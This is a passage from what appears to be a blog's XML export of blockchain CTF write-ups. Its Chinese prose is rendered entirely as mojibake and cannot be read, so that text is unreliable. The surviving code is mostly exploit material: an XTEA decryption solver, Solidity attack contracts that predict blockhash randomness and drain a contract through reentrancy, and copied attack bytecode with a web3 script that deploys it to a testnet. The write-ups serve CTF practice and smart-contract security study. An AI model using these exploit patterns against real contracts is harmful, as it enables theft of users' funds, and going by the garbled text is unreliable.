ËÄÉÁÇπÊúâ‰∏â‰∏™Ôºö ËÄÉÂØüÂØπ evm ÈÄÜÂêëËÉΩÂäõ ËÄÉÂØü xtea Âä†Ëß£ÂØÜ ËÄÉÂØü fallback Âèä msg.sender ÁöÑÁêÜËß£ Exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;string.h&gt;/* take 64 bits of data in v[0] and v[1] and 128 bits of key[0] - key[3] */void encipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) &#123; unsigned int i; uint32_t v0=v[0], v1=v[1], sum=0, delta=0x9E3779B9; for (i=0; i &lt; num_rounds; i++) &#123; v0 += (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3]); sum += delta; v1 += (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum&gt;&gt;11) &amp; 3]); &#125; v[0]=v0; v[1]=v1;&#125;void decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) &#123; unsigned int i; uint32_t v0=v[0], v1=v[1], delta=0x9E3779B9, sum=delta*num_rounds; for (i=0; i &lt; num_rounds; i++) &#123; v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum&gt;&gt;11) &amp; 3]); sum -= delta; v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3]); &#125; v[0]=v0; v[1]=v1;&#125;int main()&#123; unsigned int i; uint32_t const k[4]=&#123;0x74686974,0x5f69735e,0x5f746573,0x746b6579&#125;; unsigned int r=32; // 2282910687825444608285583946662268071674116917685196567156 = 0x5d1ab31f6a103c8f364d33e96dbdd5cdbd40d15e55c23274 uint32_t enc1[2] = &#123;0x5d1ab31f, 0x6a103c8f&#125;; uint32_t enc2[2] = &#123;0x364d33e9, 0x6dbdd5cd&#125;; uint32_t enc3[2] = &#123;0xbd40d15e, 0x55c23274&#125;; char flag[50]; decipher(r, enc1, k); decipher(r, enc2, k); decipher(r, enc3, k); printf(&quot;Ëß£ÂØÜÂêéÁöÑÊï∞ÊçÆÔºö%x %x %x %x %x %x\n&quot;,enc1[0],enc1[1],enc2[0],enc2[1],enc3[0],enc3[1]); // 0x5f5f6f685f66616e74616e73697469635f626162795f5f5f int s[24] = &#123;0x5f, 0x5f, 0x6f, 0x68, 0x5f, 0x66, 0x61, 0x6e, 0x74, 0x61, 0x6e, 0x73, 0x69, 0x74, 0x69, 0x63, 0x5f, 0x62, 0x61, 0x62, 0x79, 0x5f, 0x5f, 0x5f&#125;; for (i=0; i&lt;24; i++) &#123; printf(&quot;%c&quot;, s[i]); &#125; return 0;&#125; ‰∏äÈù¢ÁöÑ exp ÂèØ‰ª•ËÆ°ÁÆóÂá∫ s ÁÑ∂ÂêéË∞ÉÁî® set_s(s)ÔºåË∞ÉÁî® Encrypt() ÊúÄÂêéÁªôÂêàÁ∫¶ËΩ¨Ë¥¶ÈáëÈ¢ù 0ÔºåËß¶Âèë receive ÂáΩÊï∞Ë∞ÉÁî® payforflag Âç≥ÂèØ]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>Smart Contract</tag>
        <tag>Âçé‰∏∫‰∫ëÂÆâÂÖ® ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[bjdctf_4th]]></title>
    <url>%2F2020%2Fbjdctf-4th%2F</url>
    <content type="text"><![CDATA[ÂâçË®Ä È¶ñÂÖàÂú£ËØûÂìàÁöÆ‰∏´ÔºåÂú£ËØûÂèÇÂä†‰∫Ü BJDCTF 4th ÔºåÂèØÊÉúÁî±‰∫éÊòØÂë®‰∫îÔºåÊó∂Èó¥‰∏çÂ§™ÂÖÖË∂≥ÔºåÂ§ßÊ¶ÇÊÄªÁöÑÂÅöÈ¢òÊó∂Èó¥Â∞±‰∏§‰∏™Â∞èÊó∂ÔºåÂ∞±Âè™ÊääËá™Â∑±ÊìÖÈïøÁöÑÂå∫ÂùóÈìæÁöÑÈ¢òÁõÆÂÅö‰∫Ü‰∏Ä‰∏ã ÊÑüË∞¢Âá∫È¢ò‰∫∫Â∞èÁ∫¢Ëä±Â∏àÂÇÖÊ≤°ÊúâÊö¥ÊâìÊàë ËøôÈáå‰∏ç‰ºö‰ªãÁªçÈ¢òÁõÆÔºåÂè™ÊòØÈöè‰æøË∞à‰∏Ä‰∫õÊÑüÊÖ®ÂêßÔºà‰∏ªË¶ÅÊòØÊàë‰πü‰∏çÁü•ÈÅìÈ¢òÁõÆÈÉΩÂú®ËÄÉÂØü‰ªÄ‰πàÔºåÂõ†‰∏∫ÊàëÊ≤°ÂéªÂàÜÊûêÔºåÈù†ÁùÄÂº∫Â§ßÁöÑÊöóÈªë‰πãÂäõÔºåÊàëÊâæÂà∞‰∫ÜÈìæ‰∏äÂ∞èÁ∫¢Ëä±Â∏àÂÇÖÊµãËØïÁöÑ‰∫§ÊòìÔºåÁÑ∂ÂêéÂ§ßÂÆ∂ÈÉΩÊáÇÁöÑÔºåÊàëÂ∞±Áõ¥Êé•Â§çÁî®‰∫ÜÔºâ ‰∏ªË¶ÅÊÉ≥ËØ¥ÁöÑÊòØÔºåÂØπ‰∫éÂå∫ÂùóÈìæÁöÑÈ¢òÁõÆÔºåÂ¶ÇÊûúÁêÜËß£‰∫ÜÊú¨Ë¥®ÔºåÈÉΩÊòØÂæàÂÆπÊòìÁöÑ Áé∞Âú®Âå∫ÂùóÈìæÈ¢òÁõÆËøòÊ≤°Êúâ‰∏Ä‰∏™ÂΩªÂ∫ïÁöÑËÉΩÂ§üËß£ÂÜ≥ÊàëËøôÁßç‚ÄúÊäÑ‰Ωú‰∏ö‚ÄùÁé∞Ë±°ÁöÑÊñπÊ°àÔºåÈô§Èùû‰Ω†ÊòØÁªôÊØè‰∏™Èòü‰ºç‰∏ÄÊù°ÁßÅÈìæÔºåËøòÂæó‰øùËØÅ‰∫íÁõ∏‰∏çËÉΩËÆøÈóÆÔºå‰ΩÜÂ¶ÇÊûúÊòØÁ∫ø‰∏ãËµõÊàñËÄÖrwÁöÑËØùÊòØÂèØ‰ª•‰øùËØÅÁöÑÔºå‰ΩÜÂØπ‰∫éÁ∫ø‰∏äËµõËøôÁßçÔºåÁõÆÂâçÊòØÊ≤°ÊúâËß£ÂÜ≥ÂäûÊ≥ïÁöÑ ‰∏çËøáÂ∏åÊúõÁúãÂà∞ÊñáÁ´†ÁöÑÂêåÂ≠¶‰∏çË¶ÅÂ≠¶ÊàëÂìàÔºåÊàëËøôÊ¨°ÊØîËµõÊú¨Êù•ÊòØÊÉ≥ÁùÄËá™Â∑±Â•ΩÂ•ΩÂÅö‰∏Ä‰∏ãÂ≠êÁöÑÔºåÂõ†‰∏∫‰πüÂ•Ω‰πÖÊ≤°ÊúâÂÅöËøáÈ¢ò‰∫ÜÔºåÊÉ≥Áúã‰∏Ä‰∏ãËá™Â∑±ÂÅöÈ¢òÁöÑËÉΩÂäõÔºåÁªìÊûúÁî±‰∫éÂë®‰∫î‰∫ãÊÉÖÊØîËæÉÂ§öÔºåÊÄªÁöÑÊØîËµõÊó∂Èó¥‰πü‰∏çËøáÂ∞±2‰∏™Â∞èÊó∂ÔºåÊàëÂ∞±ÂÅ∑‰∫Ü‰∏™ÊáíÔºåÁõ¥Êé•ÂéªÊâæ‰∫§Êòì‰∫ÜÔºàÈÄÉ ‰∏çËøáÁé∞Âú®ÁöÑÂå∫ÂùóÈìæÊØîËµõÂ∑≤ÁªèÊØî‰πãÂâçÂ•ΩÂ§ö‰∫ÜÔºåÂá∫È¢ò‰∫∫‰πüÂ∞ΩÈáè‰ºöËÄÉËôëÂà∞Ëøô‰∏™ÈóÆÈ¢òÔºåËôΩÁÑ∂Ëøò‰∏çËÉΩÂÆåÂÖ®Ëß£ÂÜ≥Ôºå‰ΩÜÊòØÂú®‰∏ÄÂÆöÁ®ãÂ∫¶‰∏äÊòØÂáèËΩª‰∫ÜËøôÁßç‚ÄúÊäÑ‰Ωú‰∏ö‚ÄùÁöÑËÉΩÂäõÔºå‰πüÂ∏åÊúõÊúâÊÉ≥Ê≥ïÁöÑÂêÑ‰Ωçüë¥ÂèØ‰ª•‰∏éÊàëÊé¢ËÆ®Ëß£ÂÜ≥ÊñπÊ°à Â•ΩÂï¶ÔºåÂÖ∂ÂÆû‰πüÊ≤°Â§™Â§öÊÉ≥ËØ¥ÁöÑÔºå‰∏ªË¶ÅËøòÊòØÊò®Â§©ÁöÑËäÇÊó•Âø´‰πê‰∏´ÔºåËøüÊù•ÁöÑÁ•ùÁ¶èÁï•Áï•Áï•]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>BJDCTF 4th</tag>
        <tag>Smart Contract</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Security Innovation]]></title>
    <url>%2F2020%2Fsecurityinnovation%2F</url>
    <content type="text"><![CDATA[ÂâçË®Ä ÂèåÂçÅ‰∏ÄÂìàÁöÆüê∂ https://blockchain-ctf.securityinnovation.com/#/ ÂÅö‰∫Ü‰∏ÄÈÅçÔºåÊÑüËßâËøô‰∏™ÁΩëÁ´ô‰∏äÈù¢ÁöÑÈ¢òÁõÆÂèØËÉΩÊõ¥Ë¥¥ËøëÂÆûÈôÖ‰∏Ä‰∫õÔºåÊñ∞ÊâãÂ∞èÁôΩÂà∑ÂÆå https://ethernaut.openzeppelin.com/ ‰πãÂêéÔºåÂèØ‰ª•ÈÄâÊã©ÊÄßÊù•ÂÅöËøô‰∏™ÁΩëÁ´ôÁöÑÈ¢òÁõÆ ÈöæÂ∫¶ËøòÊòØÊúâÁöÑÔºåËøòÊúâÂæàÂ§öÂ∞è trick ÔºåÁõÆÂâç‰∏äÈù¢ÊòØ 13 ÈÅìÈ¢òÁõÆ Áúã‰∫Ü„ÄäÊï∞Á†ÅÂÆùË¥ùÔºöÊúÄÂêéÁöÑËøõÂåñ„ÄãÔºåÁà∑ÈùíÁªìÔºåÁÑ∂ÂêéÂèëÁé∞Â•Ω‰πÖÊ≤°ÂÅöÈ¢ò‰∫ÜÔºåÁÜüÊÇâ‰∏Ä‰∏ãÂÅöÈ¢òÔºåÂ§ß‰Ω¨ÂãøÂñ∑Ôºå‰∏çÊòØ WP ÔºåÈöè‰æøÂÜô‰∏Ä‰∏ã ÂæàÂ§öÊòØÂèÇËÄÉ‰∫ÜÁΩë‰∏äÁöÑ wp ÁöÑÂÜÖÂÆπ ÊáíÁôåÊÇ£ËÄÖ :) Donation Áõ¥Êé•Ë∞ÉÁî® withdrawDonationsFromTheSuckersWhoFellForIt ÂáΩÊï∞Âç≥ÂèØ Lock Box ËÄÉÁÇπÊòØ EVM ‰∏≠ storage Â≠òÂÇ®ÁöÑËØªÂèñ 1await web3.eth.getStorageAt(ContractAddress, &quot;1&quot;, function(x,y)&#123;console.info(y);&#125;) Piggy Bank ËÄÉÁÇπÊòØÁªßÊâøÔºåÈáçÂÜôÁöÑ collectFunds ÂáΩÊï∞ÂÆûÈôÖ‰∏äË¶ÜÁõñ‰∫Ü PiggyBank ‰∏≠ÁöÑÂêåÂêçÂáΩÊï∞ Áõ¥Êé•Ë∞ÉÁî® collectFunds(piggyBalance) Âç≥ÂèØ SI Token Sale Ê∫¢Âá∫ÊºèÊ¥û balances[msg.sender] += _value ‚Äì feeAmount Âè™Ë¶Å‰º†ÂÖ•‰∏Ä‰∏™Â∞è‰∫é feeAmount ÁöÑ _value ÔºåÂç≥ÂèØËÆ©Êàë‰ª¨ÁöÑ balances ‰∏ãÊ∫¢ÔºåÊØîÂ¶ÇÂèëÈÄÅ 1 gasÔºåÁÑ∂ÂêéÂç≥ÂèØË∞ÉÁî® refundTokens ÂáΩÊï∞Â∞ÜÂêàÁ∫¶ÁöÑ‰ΩôÈ¢ùÊ∏ÖÁ©∫ÔºåÂõ†‰∏∫ËøôÈáåÊòØÂ∞Ü _value Èô§ 2 ÂæóÂà∞ÊèêÂèñÁöÑ‰ΩôÈ¢ùÔºåÊâÄ‰ª•Êàë‰ª¨Â∞ÜÂêàÁ∫¶ÁöÑ etherCollection ‰πò 2 ‰Ωú‰∏∫ _value Âç≥ÂèØ Secure Bank MembersBank ÂêàÁ∫¶Ë∑ü SecureBank ÂêàÁ∫¶ÁöÑ withdraw ÂáΩÊï∞ÁöÑÂèÇÊï∞Á±ªÂûã‰∏çÂêåÔºå‰∏Ä‰∏™ÁöÑ _value ÊòØ uint8ÔºåÂè¶‰∏Ä‰∏™Âç¥ÊòØ uint256ÔºåËøôÊ†∑Ëøô‰∏§‰∏™ÂáΩÊï∞ÁöÑÁ≠æÂêçÂ∞±‰∏çÁõ∏Âêå‰∫ÜÔºåÂú®ÂêàÁ∫¶Èáå‰πüÂ∞±ÊòØ‰∏§‰∏™‰∏çÂêåÁöÑÂáΩÊï∞Ôºå‰∏çËøáÂÆÉ‰ª¨‰ΩøÁî® super.withdraw ÊúÄÁªàÈÉΩ‰ºöË∞ÉÁî® SimpleBank ÁöÑ withdraw ÂáΩÊï∞ MembersBank ‰∏≠‰ªÖÈúÄË¶ÅÊòØÊ≥®ÂÜåÁî®Êà∑Âç≥ÂèØÔºåÊâÄ‰ª•ËøôÈ¢òÁöÑÊµÅÁ®ãÂ∞±ÊòØÂÖàË∞ÉÁî® register ÂáΩÊï∞Ê≥®ÂÜå‰∏Ä‰∏ãÔºåÁÑ∂Âêé‰ΩøÁî® etherscan Âú®ÊåëÊàòÂêàÁ∫¶ÁöÑÂàõÂª∫‰∫§ÊòìÈáåÊü•Áúã‰∏Ä‰∏ãÂêàÁ∫¶ÁöÑÂàõÂª∫ËÄÖÔºåÂõ†‰∏∫ÂêàÁ∫¶ÁöÑ ether ÈÉΩÂ≠òÂú®‰∫ÜÂÆÉÁöÑË¥¶Êà∑‰∏äÔºåÁÑ∂ÂêéÊàë‰ª¨Áõ¥Êé•‰ΩøÁî®Ëøô‰∏™Âú∞ÂùÄÊù•Ë∞ÉÁî® MembersBank ‰∏≠ÁöÑ withdraw ÂáΩÊï∞Âç≥ÂèØÔºå‰πüÂ∞±ÊòØÊâæÂà∞ÂèÇÊï∞Á±ªÂûã‰∏∫ uint256 ÁöÑÂáΩÊï∞ Lottery ÈöèÊú∫Êï∞È¢ÑÊµã 12345678910111213contract attack &#123; address instance_address = your challenge address; Lottery target = Lottery(your challenge address); function pwn() payable&#123; bytes32 entropy = block.blockhash(block.number); bytes32 entropy2 = keccak256(this); uint256 seeds = uint256(entropy^entropy2); target.play.value(msg.value)(seeds); &#125; function () payable&#123;&#125;&#125; Heads or Tails ÈöèÊú∫Êï∞ÊºèÊ¥û ÊØèÊ¨°ÁåúÂØπÂèØ‰ª•Ëé∑ÂæóËµåÊ≥®ÁöÑ 1.5 ÂÄçÔºåÂõ†‰∏∫ÊØèÊ¨°‰∏ãÊ≥®Âè™ËÉΩ‰∏∫ 0.1 etherÔºåÊâÄ‰ª•‰∏ÄÊ¨°ÁöÑÊî∂Áõä‰∏∫ 0.05 etherÔºåË¶ÅÂ∞ÜÂêàÁ∫¶ÁöÑ ether Ê∏ÖÁ©∫ÈúÄË¶Å 20 Ê¨°ÔºåÈÇ£‰πàÊàë‰ª¨Áõ¥Êé•Âú®ÂêàÁ∫¶‰∏≠Âæ™ÁéØË∞ÉÁî® 20 Ê¨°Âç≥ÂèØ 123456789101112131415161718contract attack &#123; address instance_address = your challenge address; HeadsOrTails target = HeadsOrTails(your challenge address); function pwn() payable &#123; bytes32 entropy = block.blockhash(block.number-1); bytes1 coinFlip = entropy[0] &amp; 1; for(int i=0;i&lt;20;i++)&#123; if (coinFlip == 1)&#123; target.play.value(100000000000000000)(true); &#125; else &#123; target.play.value(100000000000000000)(false); &#125; &#125; &#125; function () payable &#123;&#125;&#125; Record Label Ë∞ÉÁî® withdrawFundsAndPayRoyalties ÂáΩÊï∞Êó∂‰ºöÂ∞ÜÂØπÂ∫îÁöÑ _withdrawAmount ÂÖ®ÈÉ®ÂèëÈÄÅËá≥ Royalties ÂêàÁ∫¶ÔºåËÄå Royalties ‰ºöÂ∞ÜÂÖ∂‰∏≠ÁöÑ 80% ÂèëÈÄÅÁªôÂàõÂª∫ËÄÖÔºåÂâ©‰∏ãÁöÑ 20% ÂèëÂõûÂéªÔºåÊé•ÁùÄ withdrawFundsAndPayRoyalties ‰∏≠Âèà‰ºöÂ∞ÜËøô 20% ÂèëÈÄÅÁªôÊàë‰ª¨ ÊâÄ‰ª•Êàë‰ª¨Áõ¥Êé•Â∞Ü _withdrawAmount ËÆæ‰∏∫ 1 ether Êù•Ë∞ÉÁî® withdrawFundsAndPayRoyalties ÂáΩÊï∞Âç≥ÂèØ Trust Fund ÈáçÂÖ•ÊºèÊ¥û 1234567891011contract attack &#123; address instance_address = your challenge address; TrustFund target = TrustFund(your challenge address); function pwn()&#123; target.withdraw(); &#125; function() payable &#123; target.withdraw(); &#125;&#125; Slot Machine selfdestruct ‰∏ç‰ºöËß¶Âèë fallback payable ÂáΩÊï∞ Rainy Day Fund Ëøô‰∏™È¢òÁõÆ‰πüÊå∫ÊúâÊÑèÊÄùÔºåËÄÉÁÇπÊòØ create ÁöÑËÆ°ÁÆóÊñπÂºèÔºåÊèêÂâçÂêëÂèØÈ¢ÑÊµãÁöÑÂú∞ÂùÄËΩ¨Ë¥¶ ÂêàÁ∫¶Ë¥¶Êà∑ÈÉ®ÁΩ≤ÂêàÁ∫¶Ôºånonce ‰ªé 1 ÂºÄÂßãËÆ°ÁÆó Â§ñÈÉ®Ë¥¶Êà∑ÈÉ®ÁΩ≤ÂêàÁ∫¶Ôºånonce ‰ªé 0 ÂºÄÂßãËÆ°ÁÆó Raffle blockhash Ëøô‰∏™ÂáΩÊï∞ÔºåÂÆÉÂèØ‰ª•Ëé∑ÂèñÁªôÂÆöÁöÑÂå∫ÂùóÂè∑ÁöÑ hash ÂÄºÔºå‰ΩÜÂè™ÊîØÊåÅÊúÄËøëÁöÑ 256 ‰∏™Âå∫ÂùóÔºå‰∏çÂåÖÂê´ÂΩìÂâçÂå∫ÂùóÔºåÂØπ‰∫é 256 ‰∏™Âå∫Âùó‰πãÂâçÁöÑÂáΩÊï∞Â∞ÜËøîÂõû 0 Ëß¶Âèë fallback ÂáΩÊï∞ÂêéÔºåËã• fallback ÂáΩÊï∞‰∏≠ÂèàË∞ÉÁî®‰∫ÜËá™Ë∫´ÂáΩÊï∞ÔºåÈÇ£‰πàÊ≠§Êó∂Ôºåmsg.sender ÂèòÊàê‰∫ÜËá™Ë∫´ ÊâÄ‰ª•ÂÖàË∞ÉÁî® buyTicket ÔºåÁÑ∂Âêé ctf_challenge_add_authorized_sender ËÆ§ËØÅÈ¢òÁõÆÂêàÁ∫¶Âú∞ÂùÄÔºàËøôÊòØÂõ†‰∏∫Êé•‰∏ãÊù•‰ºöËß¶Âèë fallback ÂáΩÊï∞‰øÆÊîπ‰∫Ü msg.senderÔºâÔºåÊé•ÁùÄÁ≠âÂæÖ 256 ‰∏™Âå∫ÂùóÂêéËß¶Âèë fallback ÂáΩÊï∞‰∏≠ msg.value=0 ËøôÊù°ÂàÜÊîØË∞ÉÁî® closeRaffle ÂáΩÊï∞ÔºåÊúÄÂêéË∞ÉÁî® collectReward Âç≥ÂèØ Scratchcard ËøôÈÅìÈ¢òÊàëÂÅöÁöÑÂæàÁÆÄÂçïÔºåÁÆÄÂçïÂàÜÊûê‰∫Ü‰∏Ä‰∏ãÈ¢òÁõÆÁöÑÈÄªËæëÔºåÂ§ßËá¥ÂæóÂà∞ÂøÖÈ°ªÂæóÊòØÁ¨¨‰∏âÊñπÂêàÁ∫¶ÂíåÂÖ∂‰∫§‰∫íÔºåÂπ∂‰∏îÂè™ËÉΩÂú®ÊûÑÈÄ†ÂáΩÊï∞‰∏≠ÂÆåÊàêÂäüËÉΩÈÄªËæëÔºåÊâÄ‰ª•ÊàëÂ∞±ÂéªÈìæ‰∏äÊâæËÆ∞ÂΩïÂéª‰∫Ü2333ÔºåÊàêÂäüÊâæÂà∞‰∏Ä‰∏™Âà´‰∫∫ÂÅöËøáÁöÑÂêàÁ∫¶Âú∞ÂùÄ 0xD38308cb90F17a5aB1B4DD805f69Eb5798536EeaÔºåÂÆåÁæéÔºåÁÑ∂ÂêéÊü•ÁúãÂÖ∂ÂÜÖÈÉ®‰∫§ÊòìÔºàÂõ†‰∏∫ÊòØÁ¨¨‰∏âÊñπÂêàÁ∫¶‰∏éÈ¢òÁõÆËøõË°å‰∫§‰∫íÔºåÊâÄ‰ª•ÊòØÂÜÖÈÉ®‰∫§ÊòìÔºâÔºåÁÇπÂºÄ‰∫§ÊòìÂç≥ÂèØÁúãÂà∞ Input Data 10x60806040526040516020806102c08339810180604052810190808051906020019092919050505060006402540be4006305f5e1004281151561003d57fe5b0602600081905550600190505b601981111515610113578173ffffffffffffffffffffffffffffffffffffffff1660005460405180807f706c617928290000000000000000000000000000000000000000000000000000815250600601905060405180910390207c01000000000000000000000000000000000000000000000000000000009004906040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040160006040518083038185885af1935050505050808060010191505061004a565b8173ffffffffffffffffffffffffffffffffffffffff1660405180807f636f6c6c6563744d6567614a61636b706f742875696e74323536290000000000815250601b01905060405180910390207c010000000000000000000000000000000000000000000000000000000090046730927f74c9de00006040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808267ffffffffffffffff1681526020019150506000604051808303816000875af19250505050505060d2806101ee6000396000f3006080604052600436106049576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063a035b1fe14604b578063fc4333cd146073575b005b348015605657600080fd5b50605d6087565b6040518082815260200191505060405180910390f35b348015607e57600080fd5b506085608d565b005b60005481565b3373ffffffffffffffffffffffffffffffffffffffff16ff00a165627a7a72305820657390e5500a8446cf4b6fedd6a0ea0a1c3824339e44080120130ef94540ff5d0029000000000000000000000000428c0e1d593d7b85253f2dcf48bfb7626d7ce7e2 ÁÑ∂ÂêéÊàëÊää Input Data ‰∏≠Êç¢ÊàêÊàëËá™Â∑±ÁöÑÈ¢òÁõÆÂêàÁ∫¶Âú∞ÂùÄÂ∞±Ë°å‰∫ÜÔºàÂú®Â≠óËäÇÁ†ÅÁöÑÊúÄÂêéÔºâ ÁÑ∂ÂêéÊåâÁÖß create ËÆ°ÁÆóÂú∞ÂùÄÊñπÊ≥ïÔºåËÆ°ÁÆóÂá∫ÊàëËá™Â∑±Â§ñÈÉ®Ë¥¶Êà∑ÈÉ®ÁΩ≤Ê≠§ÊîªÂáªÂêàÁ∫¶ÁöÑÂú∞ÂùÄ 0xf297e7d46bdc54cdfa1cfda71e7ff0368f416705, ÊèêÂâçËøõË°å ctf_challenge_add_authorized_sender ËÆ§ËØÅ 12345678910import rlpfrom ethereum import utilsaddress = 0x88D3052D12527F1FbE3a6E1444EA72c4DdB396c2nonce = 413rlp_res = rlp.encode([address,nonce])print(rlp_res)sha3_res = utils.mk_contract_address(address,nonce)print(sha3_res)sha3_res_de = utils.decode_addr(sha3_res)print(&quot;contract_address: &quot; + sha3_res_de) ÊúÄÂêéÂ∞ÜÊîªÂáªÂêàÁ∫¶ÈÉ®ÁΩ≤Âç≥ÂèØ 12345678910111213141516171819202122232425262728from web3 import Web3, HTTPProviderw3 = Web3(Web3.HTTPProvider(&apos;https://ropsten.infura.io/v3/xxxxxx&apos;))contract_address = &quot;0x428c0e1d593d7b85253f2dcf48bfb7626d7ce7e2&quot;private = &quot;xxx&quot;public = &quot;0x88D3052D12527F1FbE3a6E1444EA72c4DdB396c2&quot;data = &apos;0x60806040526040516020806102c08339810180604052810190808051906020019092919050505060006402540be4006305f5e1004281151561003d57fe5b0602600081905550600190505b601981111515610113578173ffffffffffffffffffffffffffffffffffffffff1660005460405180807f706c617928290000000000000000000000000000000000000000000000000000815250600601905060405180910390207c01000000000000000000000000000000000000000000000000000000009004906040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040160006040518083038185885af1935050505050808060010191505061004a565b8173ffffffffffffffffffffffffffffffffffffffff1660405180807f636f6c6c6563744d6567614a61636b706f742875696e74323536290000000000815250601b01905060405180910390207c010000000000000000000000000000000000000000000000000000000090046730927f74c9de00006040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808267ffffffffffffffff1681526020019150506000604051808303816000875af19250505050505060d2806101ee6000396000f3006080604052600436106049576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063a035b1fe14604b578063fc4333cd146073575b005b348015605657600080fd5b50605d6087565b6040518082815260200191505060405180910390f35b348015607e57600080fd5b506085608d565b005b60005481565b3373ffffffffffffffffffffffffffffffffffffffff16ff00a165627a7a72305820657390e5500a8446cf4b6fedd6a0ea0a1c3824339e44080120130ef94540ff5d0029000000000000000000000000&apos;data += &apos;428c0e1d593d7b85253f2dcf48bfb7626d7ce7e2&apos;def do_callme(public): txn = &#123; &apos;from&apos;: Web3.toChecksumAddress(public), # &apos;to&apos;: Web3.toChecksumAddress(contract_address), &apos;gasPrice&apos;: w3.eth.gasPrice, &apos;gas&apos;: 3000000, &apos;nonce&apos;: w3.eth.getTransactionCount(Web3.toChecksumAddress(public)), &apos;value&apos;: Web3.toWei(1, &apos;ether&apos;), &apos;data&apos;: data, &#125; signed_txn = w3.eth.account.signTransaction(txn, private) txn_hash = w3.eth.sendRawTransaction(signed_txn.rawTransaction).hex() txn_receipt = w3.eth.waitForTransactionReceipt(txn_hash) print(&quot;txn_hash=&quot;, txn_hash) return txn_receiptprint(do_callme(public)) ÂÆåÁæéÔºåÂÅ∑Êáí‰∏çÊÑßÊòØÊàëÔºåËøôÈáåÂ∞±‰∏çÂÖ∑‰ΩìÂàÜÊûêÈ¢òÁõÆ‰∫ÜÔºåÊúâÂÖ¥Ë∂£ÁöÑËá™Ë°åÂàÜÊûê]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>Solidity</tag>
        <tag>Smart Contract</tag>
        <tag>SecurityInnovatio</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ctfÂå∫ÂùóÈìæÂá∫È¢òÊ®°Êùø dockerÈÉ®ÁΩ≤]]></title>
    <url>%2F2020%2Fblockchain-template%2F</url>
    <content type="text"><![CDATA[ctf Âå∫ÂùóÈìæÂá∫È¢òÊ®°Êùø docker ‰∏ÄÈîÆÈÉ®ÁΩ≤ ‰∏™‰∫∫ÂñúÊ¨¢ÁöÑÂá∫È¢òÊñπÂºè ÈÉ®ÁΩ≤ÂêàÁ∫¶ÁöÑÂ§ñÈÉ®Ë¥¶Êà∑ÈöèÊú∫ÁîüÊàêÔºåÊØè‰∏™ÈÄâÊâãÈÉΩ‰∏ç‰∏ÄÊ†∑ÔºåÂú®‰∏ÄÂÆöÁ®ãÂ∫¶‰∏äÂèØÈò≤Ê≠¢‚ÄúÊäÑ‰Ωú‰∏ö‚Äù ÁÇπÊàëÂéªÊü•Áúã]]></content>
      <categories>
        <category>tools</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ë∞ÉËØïevmÂ≠óËäÇÁ†Å-radare2]]></title>
    <url>%2F2020%2Fradare2%2F</url>
    <content type="text"><![CDATA[ÂâçË®Ä ‰∏çÁªèÊÑèÂèëÁé∞ÁöÑ radare2 ‰πüÂèØ‰ª•Ë∞ÉËØï EVM bytecode ÂèØË∞ÉËØï‰∫§ÊòìÂÆûÊó∂Êü•Áúã stack Âíå memory ‰ø°ÊÅØ ‰∏çÊñ≠Êé¢Á¥¢Â•ΩÁî®Â•ΩÁé©ÁöÑÂäüËÉΩÔºå‰∏çÊñ≠Êõ¥Êñ∞ ÂÖ∑‰ΩìÁöÑÊåá‰ª§ÂèäÂÖ∂Êìç‰ΩúÂ∞±Èù†Ëá™Â∑±ÂíØ ‰ΩøÁî®Â¶Ç‰∏ãÂëΩ‰ª§ËøûÊé•Âà∞‰∫§ÊòìË∞ÉËØï 1r2 -a evm -D evm &quot;evm://localhost:8545@0x837f83456921c1f38605d87ed7850c0aa668ecce55efbedf9da21d712dd040fe&quot; stack Ê†àÈ°∂Âú® 0x00008fff ‰ΩçÁΩÆ memory ‰ΩçÁΩÆ‰ªé 0x10000 ÂºÄÂßãÔºåÊâÄ‰ª•ÈúÄË¶ÅÊâãÂ∑•Ë∞ÉÊï¥Âà∞ 0x10000 ÔºåÂèØ‰ΩøÁî®Â¶Ç‰∏ãÂëΩ‰ª§ 1px 512 @ 0x10000]]></content>
      <categories>
        <category>tools</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>evm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[qwb2020 Á¨¨ÂõõÂ±äÂº∫ÁΩëÊùØÁ∫ø‰∏ãËµõÂå∫ÂùóÈìæ EGM]]></title>
    <url>%2F2020%2Fegm%2F</url>
    <content type="text"><![CDATA[ÂâçË®Ä Á¨¨ÂõõÂ±ä qwb Á∫ø‰∏ãËµõ EGM ËµõÈ¢ò WP ËÄÉÁÇπÊòØ Return Oriented Programming ÂÄüÁî®Â∑•ÂÖ∑ ida-evm ÂèçÊ±áÁºñËæÖÂä©ÂàÜÊûê ‰πüÂèØÂÄüÂä©Âú®Á∫øÂ∑•ÂÖ∑ https://www.trustlook.com/services/smart.html ÂèçÁºñËØëËæÖÂä©ÂàÜÊûê 